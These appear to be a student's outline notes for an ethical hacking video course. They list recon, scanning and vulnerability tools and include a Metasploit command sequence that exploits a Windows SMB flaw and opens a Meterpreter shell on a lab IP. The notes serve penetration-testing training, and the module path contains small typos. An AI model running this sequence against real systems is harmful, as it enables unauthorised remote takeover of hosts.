# Complete Ethical Hacking Bootcamp 2021: Zero to Mastery

https://www.udemy.com/course/complete-ethical-hacking-bootcamp-zero-to-mastery

## Section 4: Reconnaissance & Information Gathering
* ping
* whois
* nslookup
* https://ipinfo.info/
* whatweb
* theHarvester
* hunter.io
* sherlock

## Section 5: Scanning
* metasploitable
* arp
* netdiscover
* nmap

## Section 7: Vulnerability Analysis
* nmap scripts
* google search exploit
* searchsploit
* nessus

## Section 8: Exploitation & Gaining Access
* metasploit framework
  * msfconsole
```
msf6 > show exploits
msf6 > use exploits/windows/smb/ms06_640_netapi
msf6 exploit(windows/smb/ms06_640_netapi) > show info
msf6 exploit(windows/smb/ms06_640_netapi) > show options
msf6 exploit(windows/smb/ms06_640_netapi) > set RHOSTS 192.168.1.26
msf6 exploit(windows/smb/ms06_640_netapi) > show payloads
msf6 exploit(windows/smb/ms06_640_netapi) > set payload windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/ms06_640_netapi) > show targets
msf6 exploit(windows/smb/ms06_640_netapi) > set target 3
msf6 exploit(windows/smb/ms06_640_netapi) > exploit
msf6 exploit(windows/smb/ms06_640_netapi) > run
msf6 > search vsftpd
msf6 > sessions
msf6 > sessions -i <id>
```
* netcat
* telnet
* search routersploit

## Section 9: SMBGhost CVE 2020-0796 - Windows 10 Manual Exploitation
* https://rufus.ie/
